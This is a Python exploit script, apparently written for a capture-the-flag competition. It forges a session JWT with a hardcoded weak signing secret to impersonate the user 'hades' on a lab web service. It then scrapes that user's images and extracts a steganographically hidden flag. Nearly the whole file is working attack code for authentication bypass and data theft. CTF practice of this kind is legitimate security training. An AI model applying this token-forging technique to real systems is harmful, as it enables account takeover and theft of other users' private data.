#!/usr/bin/env python3

import requests
import jwt
import base64
import sys
from pwn import *
import subprocess
import tempfile
import os
from stegano import lsb
from PIL import Image

SECRET = "abcdabcd"

def create_admin_jwt(username):
    payload = {"name": username}
    token = jwt.encode(payload, SECRET, algorithm="HS256")
    return token

def exploit_specific_user(username, TARGET_URL):
    session = requests.Session()

    try:
        token = create_admin_jwt(username)
        session.cookies.set("session", token)

        profile_response = session.get(f"{TARGET_URL}/profile")
        if profile_response.status_code == 200:

            view_response = session.get(f"{TARGET_URL}/view/{username}")
            if view_response.status_code == 200:

                import re
                image_ids = re.findall(r'/image/(\d+)', view_response.text)
                for img_id in set(image_ids):

                    img_response = session.get(f"{TARGET_URL}/image/{img_id}")
                    # Extract base64 image data from HTML
                    a = img_response.text.split(":image/png;base64, ")[1].split('" />')[0]
                    return a

        return None

    except Exception as e:
        print(f"Error: {e}", flush=True)
        return None


def extract_flag_from_base64(base64_string):
    """Extract hidden flag using stegano library"""
    try:
        # Decode base64 to get image bytes
        image_data = base64.b64decode(base64_string)

        # Write to temporary file
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:
            temp_file.write(image_data)
            temp_file_path = temp_file.name

        try:
            # Open image and reveal hidden flag
            raw_flag = lsb.reveal(temp_file_path)
            
            print(f"[DEBUG] Raw reveal type: {type(raw_flag)}", flush=True)
            print(f"[DEBUG] Raw reveal repr: {repr(raw_flag)}", flush=True)
            
            # lsb.reveal() returns bytes, need to decode properly
            if isinstance(raw_flag, bytes):
                flag = raw_flag.decode('utf-8', errors='ignore')
            else:
                flag = str(raw_flag)
            
            # Clean up the flag - strip whitespace, newlines, etc.
            flag = flag.strip()
            
            # Remove literal "b'" prefix if present (stegano returns string representation)
            if flag.startswith("b'"):
                flag = flag[2:]
            if flag.endswith("'"):
                flag = flag[:-1]
            print("HIHI")
            print(f"[+] Flag extracted (cleaned): {flag}", flush=True)
            print(f"[+] Flag length: {len(flag)}", flush=True)
            
            # For debugging, check if the base64 part is missing padding
            if flag.startswith("N3m3s1s{"):
                flag_content = flag[8:].rstrip("}")
                # Add padding if missing
                missing_padding = len(flag_content) % 4
                if missing_padding and len(flag_content) < 32:
                    print(f"[!] Base64 might need padding. Current: {len(flag_content)}, Missing: {4 - missing_padding}", flush=True)
                    flag_content += "=" * (4 - missing_padding)
                    flag = f"N3m3s1s{{{flag_content}}}"
                    print(f"[+] Flag after padding: {flag}", flush=True)
            
            # Validate flag format: should be PREFIX{base64_data}
            if not flag.startswith("N3m3s1s{"):
                print(f"[-] Invalid prefix in flag: {flag[:20] if len(flag) > 20 else flag}", flush=True)
                return None
            
            return flag
        finally:
            os.unlink(temp_file_path)

    except Exception as e:
        print(f"[-] Failed to extract flag: {e}", flush=True)
        import traceback
        traceback.print_exc()
        return None

if __name__ == "__main__":

    us = 7
    user = 'hades'
    ip = f"192.168.199.{us}"
    TARGET_URL = "http://"+f"{ip}:"+"3000"
    a = exploit_specific_user(user, TARGET_URL)
    if a:
        print(f"[*] Got base64 image data, length: {len(a)}", flush=True)
        flag = extract_flag_from_base64(a)
        if flag:
            print(flag)
    else:
        print("[-] Failed to get image data", flush=True)
